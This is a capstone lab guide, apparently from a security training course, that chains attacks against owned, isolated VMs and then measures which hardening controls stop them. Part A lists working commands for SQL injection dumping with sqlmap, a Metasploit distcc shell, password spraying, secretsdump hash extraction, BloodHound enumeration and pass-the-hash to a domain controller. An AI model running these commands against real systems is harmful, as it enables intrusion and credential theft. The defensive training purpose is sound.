---
title: "Scenario 11 - Blue-team capstone: chain the whole hack, then stop it"
---

# Scenario 11 - Blue-team capstone: chain the whole hack, then stop it

> **Journey:** "Hack a Network" - module 11, the **graduation exercise**.
> **Ethics / scope:** every target is a VM/container **we own** on the isolated a local model net
> (`10.13.37.0/24`), no route to the real LAN or the internet. All "bank/crypto/secrets" are planted
> `FLAG-...` strings, all fake. This module runs the full attack once (Red), then reverts everything,
> applies one hardening control per stage, and runs it again (Blue) to **measure** what now gets
> stopped. The scorecard is the graduation artefact.

| | |
|---|---|
| **Goal** | Chain modules 00->09 into one end-to-end "Hack a Network" run, capture every flag, then flip to defence: revert all targets, apply the top control from each module, re-run the chain, and score which attacks die. |
| **Target** | The whole lab: `msf2` `.20`, `dvwa` `.34`, `juiceshop` `.35`, `blue` `.40`, `win-dc` `.50`, `win-cli` `.51`, plus the simulated Wi-Fi on Kali. |
| **Difficulty** | Intermediate (assumes modules 00-10 are done; this is the assembly). |
| **Est. time** | 90-120 min for the full Red + Blue pass. |
| **Prereqs** | Modules 00-10 completed at least once. Kali `tools-ready`. All target snapshots at `clean-baseline`. |
| **Start-from** | Kali `tools-ready`; targets powered as needed (resource budget: run the Windows pair with the Linux boxes off, per the lab docs). |

## MITRE ATT&CK mapping (the chain, by tactic)
Reconnaissance T1595 / T1046 -> Initial Access T1190 (web) & T1078 (valid accounts) -> Credential Access
T1110 / T1003.002 / T1557.001 (LLMNR poisoning) -> Discovery T1087.002 (AD enum) -> Lateral Movement
T1021.002 / T1550.002 (pass-the-hash) -> Collection T1005 / T1039 / T1552.001 -> Exfiltration T1041.

---

## PART A - RED: chain modules 00 -> 09 (one full run)

Run these in order from the Kali desktop. Each stage names the module it comes from and the flag it
yields. Tick the box as each flag pops. (VM power control is a **host-side** operation, run as
`your KVM host`, not from inside Kali.)

- [ ] **Stage 0 - Recon (module 00/01).** Sweep the subnet for live hosts and services.
  ```
  sudo nmap -sn 10.13.37.0/24                 # who is alive
  sudo nmap -sV -p- 10.13.37.20               # msf2 service versions
  ```
  **Flag:** none (recon). **You should see:** msf2 `.20`, web `.34/.35`, blue `.40`, win-dc `.50`,
  win-cli `.51`.

- [ ] **Stage 1 - Wireless entry (module 10).** Crack the simulated WPA2 AP.
  Run module 10 end-to-end on Kali. **Flag:** `FLAG-WIFI` (the recovered passphrase). In the lab this
  is the self-contained hwsim crack; narratively it is "the attacker is now on the LAN".

- [ ] **Stage 2 - Web foothold (modules 02/03).** SQL-inject the planted web app for credentials.
  ```
  sqlmap -u "http://10.13.37.34/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=<yours>; security=low" --batch --dump -T users
  ```
  **Flag:** `FLAG-CREDS` (a reused password recovered from the app DB). **You should see:** dumped
  user rows / password hashes from DVWA.

- [ ] **Stage 3 - Linux target (module 04).** Take a shell on the classic vulnerable Linux box.
  ```
  msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS 10.13.37.20; run; exit"
  ```
  **Flag:** (foothold marker). **You should see:** a command shell / session on msf2.

- [ ] **Stage 4 - Credential access on the domain (modules 06/08).** Spray + poison + dump.
  ```
  nxc smb 10.13.37.51 -u svc-backup -p 'Hacklab2026!' -d hacklab.local           # (Pwn3d!)
  impacket-secretsdump hacklab.local/svc-backup:'Hacklab2026!'@10.13.37.51        # local hashes
  # (module 06 also covers responder LLMNR/NBT-NS poisoning to harvest a hash)
  ```
  **Flag:** domain foothold / hashes. **You should see:** `(Pwn3d!)` on win-cli and NTLM hashes.

- [ ] **Stage 5 - Map the AD (module 07).** Enumerate the domain graph.
  ```
  bloodhound-python -u svc-backup -p 'Hacklab2026!' -d hacklab.local -ns 10.13.37.50 -c All
  ```
  **You should see:** collected JSON; `svc-backup` shown as a path to Domain Admins.

- [ ] **Stage 6 - Loot + exfil (module 09).** Grab the bank/crypto/password loot off win-cli.
  Run module 09 steps 1-6. **Flags:** `FLAG-BANK`, `FLAG-SEED`, `FLAG-CREDS` (in `~/loot` on Kali).

- [ ] **Stage 7 - Lateral / privilege (module 09 step 7 -> DC).** Replay the local admin hash.
  ```
  nxc smb 10.13.37.50 -u Administrator -H <NThash-from-secretsdump>              # pass-the-hash to the DC
  ```
  **Flag:** `FLAG-ADMIN` (proof of domain-wide privilege). **You should see:** `(Pwn3d!)` on win-dc.

**End of Red pass:** you hold `FLAG-WIFI, FLAG-CREDS, FLAG-BANK, FLAG-SEED, FLAG-ADMIN`. Save `~/loot`
and your terminal logs, that is the "what they lost and why" evidence.

---

## PART B - BLUE: revert, harden, re-run

### B1 - Revert everything to clean baseline
Windows VMs use external UEFI snapshots, so **shut down first**:
```
# Windows (shut down, then revert):
virsh -c qemu:///system shutdown win-cli ; virsh -c qemu:///system shutdown win-dc
# wait for both to power off, then:
virsh -c qemu:///system snapshot-revert win-cli clean-baseline
virsh -c qemu:///system snapshot-revert win-dc  clean-baseline

# Linux VMs:
virsh -c qemu:///system snapshot-revert blue clean-baseline
virsh -c qemu:///system destroy msf2 ; virsh -c qemu:///system start msf2   # 2008 kernel ignores ACPI reboot
virsh -c qemu:///system snapshot-revert msf2 clean-baseline

# Web containers (recreate for a clean state):
docker rm -f dvwa juiceshop
docker run -d --name dvwa      --network hacklab-mv --ip 10.13.37.34 --restart unless-stopped vulnerables/web-dvwa
docker run -d --name juiceshop --network hacklab-mv --ip 10.13.37.35 --restart unless-stopped bkimminich/juice-shop

# Kali Wi-Fi sim leaves no state: sudo rmmod mac80211_hwsim (if still loaded).
```

### B2 - Apply the one top control per stage
Apply exactly the priority-1 fix from each module (do not fix everything, so the scorecard is honest):

| Stage | Top control to apply | How (concise) |
|---|---|---|
| 1 Wi-Fi | **WPA3-SAE** (module 10 D1) | `wpa_key_mgmt=SAE` + `ieee80211w=2` in `hostapd.conf` |
| 2 Web | **Input validation / parameterised queries** (set DVWA security to High) | DVWA Security page -> `High`; or patch the query |
| 3 Linux | **Remove the vulnerable service / patch** (module 04/05) | on `blue` (the hardened stand-in) disable the exposed service + host firewall; on msf2, block the port |
| 4 Creds | **Least privilege**: remove `svc-backup` from Domain Admins (module 09 D4) | on win-dc: `Remove-ADGroupMember "Domain Admins" -Members svc-backup -Confirm:$false` |
| 5 AD map | **Disable LLMNR/NBT-NS** so poisoning yields no hash (module 06) | GPO: turn off multicast name resolution; disable NetBIOS over TCP/IP |
| 6 Loot | **Hardware wallet + offline seed** (module 09 D1): remove the seed file | delete `C:\Users\Public\Documents\seed.txt` (simulates "the seed never lived here") |
| 7 Lateral | **Least privilege + unique local admin passwords (LAPS)** so a dumped hash does not replay | rotate/uniquify local admin creds; the pass-the-hash target no longer accepts the reused hash |

### B3 - Re-run the chain and score
Re-run PART A stage by stage against the hardened lab and record, for each stage, whether the attack
still succeeds. Expected outcomes below.

---

## Scorecard (fill the last column on the Blue re-run)

| Stage | Attack (Red) | The one control that stops it | Stopped after hardening? |
|---|---|---|---|
| 1 Wi-Fi | Capture 4-way handshake, offline crack -> `FLAG-WIFI` | WPA3-SAE (no offline-crackable handshake) | **Yes** - no PSK handshake to crack |
| 2 Web | SQLi dumps app users -> `FLAG-CREDS` | Parameterised queries / input validation (DVWA High) | **Yes** - injection no longer returns data |
| 3 Linux | Exploit exposed service -> shell on msf2 | Patch / remove service + host firewall | **Yes** - port closed / service gone |
| 4 Creds | `svc-backup` = local admin on win-cli (`Pwn3d!`) -> `secretsdump` | Least privilege (not a Domain Admin) | **Yes** - no `Pwn3d!`, `secretsdump` denied |
| 5 AD map | Responder poisons LLMNR -> captured hash | Disable LLMNR/NBT-NS | **Yes** - no name-resolution to poison |
| 6 Loot | Read seed/wallet off win-cli -> `FLAG-SEED` | Hardware wallet, seed never on the PC | **Yes** - no seed file exists to find |
| 7 Lateral | Pass-the-hash local admin -> `FLAG-ADMIN` on win-dc | Least privilege + LAPS (unique local admin PW) | **Yes** - reused hash does not replay |

> **Teaching point for the class:** notice which controls stop *multiple* stages. Least privilege
> alone (stage 4) neutralises the whole "loot -> pass-the-hash -> Domain Admin" tail (stages 4, 6-partial,
> 7). The single most valuable defensive change is rarely a new tool; it is removing standing privilege
> and keeping the crown-jewel key (the seed) off the networked machine entirely.

---

## Wrap-up

**Flags / evidence:** Red pass yields `FLAG-WIFI, FLAG-CREDS, FLAG-BANK, FLAG-SEED, FLAG-ADMIN`. Blue pass
yields a completed scorecard (the graduation deliverable) plus the terminal transcripts showing each
attack now failing. Together they are the two-column "attack vs the control that stops it" story for the
hackathon deck.

**Cleanup / reset:** after the Blue pass, return everything to clean baseline again (repeat **B1**) so the
next student starts deterministic. Tear down the Wi-Fi sim on Kali (`sudo rmmod mac80211_hwsim`;
`sudo systemctl start NetworkManager`) and `rm -rf ~/loot`.

**Go deeper: ** Research: In the module 11 capstone, which single hardening control stops the most attack stages, and why does removing standing privilege matter more than adding tools?
